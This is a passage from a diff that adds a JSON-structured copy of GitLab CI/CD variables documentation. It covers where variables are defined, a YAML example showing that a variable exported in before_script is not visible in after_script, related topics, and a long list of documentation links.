+        "Variables defined in:\n  - Instance, group, or project CI/CD settings.\n  - The `.gitlab-ci.yml` file in the `variables:` section.\n  - The `.gitlab-ci.yml` file in the `secrets:` section.\n  - The `config.toml`."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "job:\n variables:\n   JOB_DEFINED_VARIABLE: \"job variable\"\n before_script:\n   - echo \"This is the 'before_script' script\"\n   - export MY_VARIABLE=\"variable\"\n script:\n   - echo \"This is the 'script' script\"\n   - echo \"JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}\"\n   - echo \"CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}\"\n   - echo \"MY_VARIABLE's value is ${MY_VARIABLE}\"\n after_script:\n   - echo \"JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}\"\n   - echo \"CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}\"\n   - echo \"MY_VARIABLE's value is ${MY_VARIABLE}\"",
+      "kind": "code"
+    },
+    {
+      "text": "When the runner executes the job:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "`before_script` is executed:\n  1. Prints to the output.\n  1. Defines the variable for `MY_VARIABLE`.",
+        "`script` is executed:\n  1. Prints to the output.\n  1. Prints the value of `JOB_DEFINED_VARIABLE`.\n  1. Prints the value of `CI_COMMIT_SHA`.\n  1. Prints the value of `MY_VARIABLE`.",
+        "`after_script` is executed in a new, separate shell context:\n  1. Prints to the output.\n  1. Prints the value of `JOB_DEFINED_VARIABLE`.\n  1. Prints the value of `CI_COMMIT_SHA`.\n  1. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`."
+      ],
+      "kind": "list"
+    },
+    {
+      "level": 2,
+      "text": "Related topics",
+      "anchor": "related-topics",
+      "kind": "heading"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You can configure Auto DevOps to pass CI/CD variables to a running application. To make a CI/CD variable available as an environment variable in the running application’s container, prefix the variable key with `K8S_SECRET_`.",
+        "The Managing the Complex Configuration Data Management Monster Using GitLab video is a walkthrough of the Complex Configuration Data Monorepo working example project. It explains how multiple levels of group CI/CD variables can be combined with environment-scoped project variables for complex configuration of application builds or deployments.The example can be copied to your own group or instance for testing. More details on what other GitLab CI patterns are demonstrated are available at the project page.",
+        "You can pass CI/CD variables to downstream pipelines. Use `trigger:forward` keyword to specify what type of variables to pass to the downstream pipeline."
+      ],
+      "kind": "list"
+    }
+  ],
+  "links": [
+    {
+      "text": "job scripts",
+      "url": "https://docs.gitlab.com/ci/variables/job_scripts/"
+    },
+    {
+      "text": "shell the runner uses",
+      "url": "https://docs.gitlab.com/runner/shells/"
+    },
+    {
+      "text": "Psych YAML parser",
+      "url": "https://docs.ruby-lang.org/en/master/Psych.html"
+    },
+    {
+      "text": "7 advanced GitLab CI workflow hacks",
+      "url": "https://about.gitlab.com/webcast/7cicd-hacks/"
+    },
+    {
+      "text": "predefined CI/CD variables",
+      "url": "https://docs.gitlab.com/ci/variables/predefined_variables/"
+    },
+    {
+      "text": "variables",
+      "url": "https://docs.gitlab.com/ci/yaml/#variables"
+    },
+    {
+      "text": "job keywords",
+      "url": "https://docs.gitlab.com/ci/yaml/#job-keywords"
+    },
+    {
+      "text": "global keywords",
+      "url": "https://docs.gitlab.com/ci/yaml/#global-keywords"
+    },
+    {
+      "text": "variables that are prefilled",
+      "url": "https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines"
+    },
+    {
+      "text": "run a merge request pipeline in the parent project for a merge request from a fork",
+      "url": "https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project"
+    },
+    {
+      "text": "changed",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494"
+    },
+    {
+      "text": "File",
+      "url": "https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables"
+    },
+    {
+      "text": "environment",
+      "url": "https://docs.gitlab.com/ci/environments/"
+    },
+    {
+      "text": "by using the API",
+      "url": "https://docs.gitlab.com/api/project_level_variables/"
+    },
+    {
+      "text": "by using the API",
+      "url": "https://docs.gitlab.com/api/group_level_variables/"
+    },
+    {
+      "text": "introduced",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/592708"
+    },
+    {
+      "text": "by using the API",
+      "url": "https://docs.gitlab.com/api/instance_level_ci_variables/"
+    },
+    {
+      "text": "limit a variable to protected branches and tags only",
+      "url": "https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable"
+    },
+    {
+      "text": "connect with an external secrets management provider",
+      "url": "https://docs.gitlab.com/ci/secrets/"
+    },
+    {
+      "text": "aes-256-cbc",
+      "url": "https://en.wikipedia.org/wiki/Advanced_Encryption_Standard"
+    },
+    {
+      "text": "secrets file",
+      "url": "https://docs.gitlab.com/administration/backup_restore/troubleshooting_backup_gitlab/#when-the-secrets-file-is-lost"
+    },
+    {
+      "text": "add a CI/CD variable in the UI",
+      "url": "https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui"
+    },
+    {
+      "text": "Expand variable reference",
+      "url": "https://docs.gitlab.com/ci/variables/#allow-cicd-variable-expansion"
+    },
+    {
+      "text": "service container logging",
+      "url": "https://docs.gitlab.com/ci/services/#capturing-service-container-logs"
+    },
+    {
+      "text": "Introduced",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/29674"
+    },
+    {
+      "text": "with a feature flag",
+      "url": "https://docs.gitlab.com/administration/feature_flags/"
+    },
+    {
+      "text": "Generally available",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843"
+    },
+    {
+      "text": "requirements for masked variables",
+      "url": "https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable"
+    },
+    {
+      "text": "protected branches",
+      "url": "https://docs.gitlab.com/user/project/repository/branches/protected/"
+    },
+    {
+      "text": "protected tags",
+      "url": "https://docs.gitlab.com/user/project/protected_tags/"
+    },
+    {
+      "text": "optionally access protected variables",
+      "url": "https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#control-access-to-protected-variables-and-runners"
+    },
+    {
+      "text": "defined in the .gitlab-ci.yml file",
+      "url": "https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file"
+    },
+    {
+      "text": "disabled",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144"
+    },
+    {
+      "text": "variables:expand keyword",
+      "url": "https://docs.gitlab.com/ci/yaml/#variablesexpand"
+    },
+    {
+      "text": "pipeline execution policy",
+      "url": "https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/#cicd-variables"
+    },
+    {
+      "text": "scan execution policy",
+      "url": "https://docs.gitlab.com/user/application_security/policies/scan_execution_policies/"
+    },
+    {
+      "text": "Pipeline variables",
+      "url": "https://docs.gitlab.com/ci/variables/#use-pipeline-variables"
+    },
+    {
+      "text": "Project variables",
+      "url": "https://docs.gitlab.com/ci/variables/#for-a-project"
+    },
+    {
+      "text": "Group variables",
+      "url": "https://docs.gitlab.com/ci/variables/#for-a-group"
+    },
+    {
+      "text": "Instance variables",
+      "url": "https://docs.gitlab.com/ci/variables/#for-an-instance"
+    },
+    {
+      "text": "dotenv reports",
+      "url": "https://docs.gitlab.com/ci/variables/dotenv_variables/#pass-variables-to-later-jobs"
+    },
+    {
+      "text": "rules:variables",
+      "url": "https://docs.gitlab.com/ci/yaml/#rulesvariables"
+    },
+    {
+      "text": "workflow:rules:variables",
+      "url": "https://docs.gitlab.com/ci/yaml/#workflowrulesvariables"
+    },
+    {
+      "text": "Default variables",
+      "url": "https://docs.gitlab.com/ci/yaml/#default-variables"
+    },
+    {
+      "text": "Deployment variables",
+      "url": "https://docs.gitlab.com/ci/variables/predefined_variables/#deployment-variables"
+    },
+    {
+      "text": "secrets",
+      "url": "https://docs.gitlab.com/ci/yaml/#secrets"
+    },
+    {
+      "text": "Inputs",
+      "url": "https://docs.gitlab.com/ci/inputs/"
+    },
+    {
+      "text": "GitLab 17.7",
+      "url": "https://docs.gitlab.com/update/deprecations/#increased-default-security-for-use-of-pipeline-variables"
+    },
+    {
+      "text": "pipeline inputs",
+      "url": "https://docs.gitlab.com/ci/inputs/#for-a-pipeline"
+    },
+    {
+      "text": "disable pipeline variables",
+      "url": "https://docs.gitlab.com/ci/variables/#restrict-pipeline-variables"
+    },
+    {
+      "text": "Run a pipeline manually",
+      "url": "https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs"
+    },
+    {
+      "text": "scheduled pipeline",
+      "url": "https://docs.gitlab.com/ci/pipelines/schedules/#create-a-pipeline-schedule"
+    },
+    {
+      "text": "the pipelines API endpoint",
+      "url": "https://docs.gitlab.com/api/pipelines/#create-a-new-pipeline"
+    },
+    {
+      "text": "the triggers API endpoint",
+      "url": "https://docs.gitlab.com/ci/triggers/#pass-cicd-variables-in-the-api-call"
+    },
+    {
+      "text": "push options",
+      "url": "https://docs.gitlab.com/topics/git/commit/#push-options-for-gitlab-cicd"
+    },
+    {
+      "text": "variables keyword",
+      "url": "https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline"
+    },
+    {
+      "text": "trigger:forward keyword",
+      "url": "https://docs.gitlab.com/ci/yaml/#triggerforward"
+    },
+    {
+      "text": "dotenv variables",
+      "url": "https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-dotenv-variables-created-in-a-job"
+    },
+    {
+      "text": "Introduced",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/440338"
+    },
+    {
+      "text": "updated for all new projects in new namespaces",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/502382"
+    },
+    {
+      "text": "the projects API",
+      "url": "https://docs.gitlab.com/api/projects/#update-a-project"
+    },
+    {
+      "text": "multi-project pipeline",
+      "url": "https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines"
+    },
+    {
+      "text": "inherit:variables: false",
+      "url": "https://docs.gitlab.com/ci/yaml/#inheritvariables"
+    },
+    {
+      "text": "trigger:forward:pipeline_variables",
+      "url": "https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#control-what-type-of-variables-to-forward-to-downstream-pipelines"
+    },
+    {
+      "text": "parent-child pipeline",
+      "url": "https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines"
+    },
+    {
+      "text": "Introduced",
+      "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/514242"
+    },
+    {
+      "text": "Auto DevOps",
+      "url": "https://docs.gitlab.com/topics/autodevops/"
+    },
+    {
+      "text": "prefix the variable key",
+      "url": "https://docs.gitlab.com/topics/autodevops/cicd_variables/#configure-application-secret-variables"
+    },
+    {
+      "text": "Managing the Complex Configuration Data Management Monster Using GitLab",
+      "url": "https://www.youtube.com/watch?v=v4ZOJ96hAck"
+    },
+    {
+      "text": "Complex Configuration Data Monorepo",
+      "url": "https://gitlab.com/guided-explorations/cfg-data/complex-config-data-using-ci-variables/config-data-top-scope/config-data-subscope/config-data-monorepo"
+    }
+  ]
+}
